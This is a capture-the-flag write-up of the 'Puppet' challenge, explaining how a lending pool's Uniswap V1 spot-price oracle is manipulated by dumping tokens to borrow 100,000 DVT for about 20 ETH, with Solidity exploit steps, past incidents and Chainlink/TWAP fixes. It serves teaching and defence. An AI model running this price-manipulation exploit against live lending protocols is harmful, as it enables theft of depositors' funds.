# Challenge #6: Puppet

- **Difficulty**: Hard
- **Category**: Oracle Manipulation (V1)
- **Severity**: Critical
- **Status**: SOLVED

## Overview

A lending pool allows users to borrow DVT tokens by depositing ETH as collateral. The required collateral is calculated using the spot price from a Uniswap V1 exchange pair. The pool requires 2x collateral (200% collateralization ratio). The Uniswap V1 pool initially holds 10 ETH and 10 DVT, while the lending pool holds 100,000 DVT available for borrowing.

## Vulnerability

The lending pool calculates collateral requirements using the Uniswap V1 spot price:

```solidity
function calculateDepositRequired(uint256 amount) public view returns (uint256) {
    return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
}

function _computeOraclePrice() private view returns (uint256) {
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

This is a **spot price oracle** — it reads the current ratio of ETH to DVT in the Uniswap pool at the exact moment of the query. Spot prices on AMMs are trivially manipulable: a large trade dramatically shifts the ratio in a single transaction.

## Exploit Walkthrough

**Step 1**: Dump all 1,000 DVT into the Uniswap V1 pool:

```solidity
token.approve(address(uniswapExchange), PLAYER_INITIAL_TOKEN_BALANCE);
uniswapExchange.tokenToEthSwapInput(
    PLAYER_INITIAL_TOKEN_BALANCE, 1, block.timestamp + 1
);
```

The pool now holds ~0.1 ETH and 1,010 DVT. The spot price of DVT crashes to near zero.

**Step 2**: Calculate the new collateral requirement:

```
Oracle price = ~0.1 ETH / 1010 DVT = ~0.0001 ETH per DVT
Collateral for 100k DVT = 100000 * 0.0001 * 2 = ~20 ETH
```

**Step 3**: Borrow the entire lending pool:

```solidity
uint256 depositRequired = lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
lendingPool.borrow{value: depositRequired}(POOL_INITIAL_TOKEN_BALANCE, recovery);
```

100,000 DVT borrowed for ~20 ETH instead of the legitimate ~200,000 ETH.

## Real-World Impact

- **bZx Attack (February 2020, ~$1M)**: The first major oracle manipulation exploit in DeFi. The attacker manipulated Uniswap/Kyber spot prices for undercollateralized loans — nearly identical to this challenge.
- **Harvest Finance (October 2020, ~$34M)**: Spot price manipulation on Curve pools to inflate/deflate vault share pricing.
- **Warp Finance (December 2020, ~$7.8M)**: Uniswap V2 LP token spot pricing for collateral valuation, manipulated via large swaps.

## Remediation

```solidity
// Fix 1: Use Chainlink price feeds
AggregatorV3Interface internal priceFeed;

function _computeOraclePrice() private view returns (uint256) {
    (, int256 price, , uint256 updatedAt, ) = priceFeed.latestRoundData();
    require(block.timestamp - updatedAt < MAX_STALENESS, "Stale price");
    require(price > 0, "Invalid price");
    return uint256(price);
}

// Fix 2: Use TWAP (Time-Weighted Average Price)
function _computeOraclePrice() private view returns (uint256) {
    (uint256 price0Cumulative, , uint32 blockTimestamp) =
        UniswapV2OracleLibrary.currentCumulativePrices(uniswapPair);
    uint256 timeElapsed = blockTimestamp - lastUpdateTimestamp;
    require(timeElapsed >= MIN_TWAP_PERIOD, "TWAP period too short");
    return (price0Cumulative - lastPrice0Cumulative) / timeElapsed;
}
```

## Key Takeaway

Never use AMM spot prices as oracles — they are trivially manipulable in a single transaction; use TWAPs or external price feeds.
